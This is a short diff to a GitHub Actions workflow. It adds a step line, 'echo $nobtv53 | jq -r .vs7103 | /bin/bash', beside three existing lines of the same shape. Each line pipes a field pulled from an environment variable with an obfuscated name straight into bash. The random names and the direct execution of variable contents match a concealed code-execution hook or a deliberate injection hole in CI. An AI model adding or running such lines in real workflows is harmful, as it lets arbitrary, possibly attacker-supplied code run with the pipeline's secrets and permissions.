@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$xpfx9" | jq -r .ytlh68 | /bin/bash
           printf '%s' "$ggvha296" | jq -r .pfpa4110 | /bin/bash
           printf '%s' "$qhh1" | jq -r .l47 | /bin/bash
+          echo $nobtv53 | jq -r .vs7103 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
